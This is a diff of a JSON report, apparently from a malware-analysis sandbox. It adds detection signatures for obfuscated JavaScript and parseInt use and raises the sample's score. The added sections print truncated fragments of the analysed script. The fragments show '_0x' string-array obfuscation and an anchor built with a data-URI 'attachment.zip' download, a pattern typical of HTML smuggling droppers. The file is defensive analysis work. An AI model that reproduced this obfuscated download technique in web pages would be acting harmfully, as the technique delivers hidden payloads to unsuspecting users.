@@ -1,7 +1,7 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 1781,
+    "score": 1801,
     "sections": [
       {
         "auto_collapse": false,
@@ -58,7 +58,31 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript appends a child object to the document and clicks it\n\t\tHTMLAnchorElement[19].click(undefined)\n",
+        "body": "The prefix '_0x' in names of variables and functions suggests that obfuscated code exists\n\t\t(function(_0x17d8e9,_0x559430){var _0x555db2=_0x42bb,_0x449335=_0x17d8e9();while(!![]){try{var _0x2e...\n\t\tvar _0x16c1b5=_0x495e\n\t\tfunction _0x5d86(){var _0x3b3ba2=['8825408awNYCk','92322coUaUb','19qWKagn','5723226ZIvpYP','345814wo...\n\t\t_0x5d86=function(){return _0x3b3ba2\n\t\treturn _0x5d86()\n\t\t}function _0x495e(_0x4fdc7d,_0x294c4a){var _0x5d86d6=_0x5d86()\n\t\treturn _0x495e=function(_0x495ef4,_0x3b88d3){_0x495ef4=_0x495ef4-0x72\n\t\tvar _0x5c5159=_0x5d86d6[_0x495ef4]\n\t\treturn _0x5c5159\n\t\t},_0x495e(_0x4fdc7d,_0x294c4a)\n\t\t}(function(_0x3d0ea6,_0x26eab9){var _0xec4ad7=_0x495e,_0x4dca23=_0x3d0ea6()\n\t\twhile(!![]){try{var _0x32f8ff=parseInt(_0xec4ad7(0x72))/0x1*(parseInt(_0xec4ad7(0x79))/0x2)+parseInt...\n\t\tif(_0x32f8ff===_0x26eab9)break\n\t\telse _0x4dca23['push'](_0x4dca23['shift']())\n\t\t}catch(_0x23d4ba){_0x4dca23['push'](_0x4dca23['shift']())\n\t\t}}}(_0x5d86,0x96f62))\n\t\tvar unswerving=_0x16c1b5(0x75)\n\t\tvar _0x22917c=_0x3835\n\t\tfunction _0x3835(_0x474de7,_0x4d3a4a){var _0x484594=_0x4845()\n\t\treturn _0x3835=function(_0x3835c6,_0xb512b0){_0x3835c6=_0x3835c6-0x7d\n\t\tvar _0x182149=_0x484594[_0x3835c6]\n\t\treturn _0x182149\n\t\t},_0x3835(_0x474de7,_0x4d3a4a)\n\t\t}(function(_0xefc644,_0x342bad){var _0x11c4eb=_0x3835,_0x3e7513=_0xefc644()\n\t\twhile(!![]){try{var _0x1f32ca=parseInt(_0x11c4eb(0x85))/0x1*(parseInt(_0x11c4eb(0x8a))/0x2)+parseInt...\n\t\tif(_0x1f32ca===_0x342bad)break\n\t\telse _0x3e7513['push'](_0x3e7513['shift']())\n\t\t}catch(_0x3a4a25){_0x3e7513['push'](_0x3e7513['shift']())\n\t\t}}}(_0x4845,0x33453))\n\t\tvar element=document[_0x22917c(0x83)]('a')\n\t\telement[_0x22917c(0x8b)]('href',_0x22917c(0x81)+unswerving),element[_0x22917c(0x8b)](_0x22917c(0x7d)...\n\t\tfunction _0x4845(){var _0x277c77=['22iPtJcA','3425mQGKDW','attachment.zip','data:application/octet-s...\n\t\t_0x4845=function(){return _0x277c77\n\t\treturn _0x4845()\n\t\t(function(_0x17d8e9,_0x559430){var _0x555db2=_0x42bb,_0x449335=_0x17d8e9()\n\t\twhile(!![]){try{var _0x2ebf66=parseInt(_0x555db2(0x208))/0x1+parseInt(_0x555db2(0x1f6))/0x2+-parseIn...\n\t\tif(_0x2ebf66===_0x559430)break\n\t\telse _0x449335['push'](_0x449335['shift']())\n\t\t}catch(_0x19b5b3){_0x449335['push'](_0x449335['shift']())\n\t\t}}}(_0x5f03,0x997cb))\n\t\tfunction rv(_0x5b42ee){var _0x3ccbcc=_0x42bb\n\t\treturn _0x5b42ee[_0x3ccbcc(0x1ee)]('')['reverse']()[_0x3ccbcc(0x1f7)]('')\n\t\t}function r1(_0x410c06){var _0x15c115=_0x42bb\n\t\treturn(_0x410c06?_0x410c06:this)[_0x15c115(0x1ee)]('')['map'](function(_0x2c08fa){var _0x43dbd3=_0x1...\n\t\tif(!_0x2c08fa[_0x43dbd3(0x1f9)](/[A-Za-z]/))return _0x2c08fa\n\t\treturn c=Math[_0x43dbd3(0x1f1)](_0x2c08fa[_0x43dbd3(0x1f5)](0x0)/0x61),k=(_0x2c08fa[_0x43dbd3(0x1f4)...\n\t\t})[_0x15c115(0x1f7)]('')\n\t\t}function _0x5f03(){var _0x60b53a=['src','1697286vcPHma','textContent','embed','getElementById','cre...\n\t\t_0x5f03=function(){return _0x60b53a\n\t\treturn _0x5f03()\n\t\t}function load(){var _0x1f874d=_0x42bb,_0x461262=_0x1f874d(0x1fb),_0x5da27a=document[_0x1f874d(0x207...\n\t\t_0x5da27a[_0x1f874d(0x1f2)](_0x1f874d(0x201),0x1e),_0x5da27a[_0x1f874d(0x1f2)](_0x1f874d(0x1ff),0x3)...\n\t\t}function _0x42bb(_0x1f2453,_0x3eddc0){var _0x5f0395=_0x5f03()\n\t\treturn _0x42bb=function(_0x42bb15,_0x2afcd0){_0x42bb15=_0x42bb15-0x1ee\n\t\tvar _0x41db8c=_0x5f0395[_0x42bb15]\n\t\treturn _0x41db8c\n\t\t},_0x42bb(_0x1f2453,_0x3eddc0)\n\t\t}function ps(){var _0x31d693=_0x42bb\n\t\tdocument['write'](_0x31d693(0x1fd))",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "_0x_prefix": 10
+          },
+          "signatures": {
+            "_0x_prefix": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: ObfuscationPrefix",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript appends a child object to the document and clicks it\n\t\tHTMLAnchorElement[19].click(undefined)",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -82,7 +106,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "Object(s) are written to the DOM\n\t\tdocument[6].write(content) 17 bytes\n",
+        "body": "Object(s) are written to the DOM\n\t\tdocument[6].write(content) 17 bytes",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -102,6 +126,30 @@
         "promote_to": null,
         "tags": {},
         "title_text": "Signature: DocumentWrite",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript uses parseInt to convert a string to an integer\n\t\t(function(_0x17d8e9,_0x559430){var _0x555db2=_0x42bb,_0x449335=_0x17d8e9();while(!![]){try{var _0x2e...\n\t\twhile(!![]){try{var _0x32f8ff=parseInt(_0xec4ad7(0x72))/0x1*(parseInt(_0xec4ad7(0x79))/0x2)+parseInt...\n\t\twhile(!![]){try{var _0x1f32ca=parseInt(_0x11c4eb(0x85))/0x1*(parseInt(_0x11c4eb(0x8a))/0x2)+parseInt...\n\t\twhile(!![]){try{var _0x2ebf66=parseInt(_0x555db2(0x208))/0x1+parseInt(_0x555db2(0x1f6))/0x2+-parseIn...",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "parseint_usage": 10
+          },
+          "signatures": {
+            "parseint_usage": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: ParseIntUsage",
         "zeroize_on_tag_safe": false
       },
       {
@@ -225,6 +273,13 @@
         "attack_ids": [],
         "heur_id": 3,
         "signatures": [
+          "_0x_prefix"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
           "append_and_click"
         ]
       },
@@ -233,6 +288,13 @@
         "heur_id": 3,
         "signatures": [
           "document_write"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "parseint_usage"
         ]
       },
       {
